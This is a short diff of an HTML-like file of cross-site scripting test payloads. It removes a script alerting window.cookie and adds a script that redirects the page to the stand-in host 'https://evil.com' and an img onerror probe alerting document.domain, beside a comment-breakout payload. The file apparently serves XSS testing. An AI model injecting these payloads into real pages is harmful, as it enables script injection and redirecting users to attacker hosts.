@@ -9,7 +9,8 @@
 
 			
 			<--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
-				<script>alert(window.cookie);</script>
+				<script>alert(window.location.href='https://evil.com');</script>
+				<img src=x onerror=alert(document.domain);>
 		
 
 
